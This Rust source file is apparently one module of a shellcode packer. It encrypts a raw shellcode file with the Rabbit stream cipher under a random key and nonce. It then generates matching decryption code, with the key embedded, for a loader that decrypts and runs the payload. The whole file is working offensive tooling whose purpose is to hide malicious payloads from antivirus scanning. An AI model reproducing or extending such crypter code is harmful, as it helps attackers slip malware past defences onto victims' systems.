use owo_colors::{OwoColorize, Stream::Stdout};
use rabbit::cipher::{KeyIvInit, StreamCipher};
use rabbit::Rabbit;
use std::collections::HashMap;
use std::path::Path;

use crate::utils::{meta_vec_from_file, random_vec, write_to_file};

fn rabbit_encrypt(shellcode: &[u8], key: &[u8; 16], nonce: &[u8; 8]) -> Vec<u8> {
    let mut vec: Vec<u8> = Vec::from(shellcode);
    let mut cipher = Rabbit::new(&(*key).into(), &(*nonce).into());
    cipher.apply_keystream(&mut vec);
    vec
}
pub fn meta_rabbit(input_path: &Path, export_path: &Path) -> HashMap<String, String> {
    let key = random_vec(16);
    let nonce = random_vec(8);
    println!(
        "{} {} encrypting shellcode with {} {:?} and {} {:?}",
        "[+]".if_supports_color(Stdout, |text| text.green()),
        "Rabbit".if_supports_color(Stdout, |text| text.yellow()),
        "key".if_supports_color(Stdout, |text| text.yellow()),
        key,
        "nonce".if_supports_color(Stdout, |text| text.yellow()),
        nonce
    );
    let unencrypted = meta_vec_from_file(input_path);
    let encrypted_content = rabbit_encrypt(
        &unencrypted,
        <&[u8; 16]>::try_from(&key[..16]).unwrap(),
        <&[u8; 8]>::try_from(&nonce[..8]).unwrap(),
    );
    match write_to_file(&encrypted_content, export_path) {
        Ok(()) => (),
        Err(err) => panic!("{:?}", err),
    }
    let mut result: HashMap<String, String> = HashMap::new();
    let decryption_function =
        "fn rabbit_decrypt(shellcode: &[u8], key: &[u8; 16], nonce: &[u8; 8]) -> Vec<u8> {
    let mut vec: Vec<u8> = Vec::from(shellcode);
    let mut cipher = Rabbit::new(&(*key).into(), &(*nonce).into());
    cipher.apply_keystream(&mut *vec);
    vec
}"
        .to_string();
    let main = format!(
        "let key: [u8; 16] = {:?};
    let nonce: [u8; 8] = {:?};
    vec = rabbit_decrypt(&vec, &key, &nonce);
    ",
        key, nonce
    );
    let dependencies = r#"rabbit = "0.4.1""#.to_string();
    let imports = "
    use rabbit::Rabbit;
    use rabbit::cipher::{KeyIvInit, StreamCipher};
    "
    .to_string();
    result.insert(String::from("decryption_function"), decryption_function);
    result.insert(String::from("main"), main);
    result.insert(String::from("dependencies"), dependencies);
    result.insert(String::from("imports"), imports);
    println!(
        "{} Done encrypting shellcode!",
        "[+]".if_supports_color(Stdout, |text| text.green())
    );
    result
}
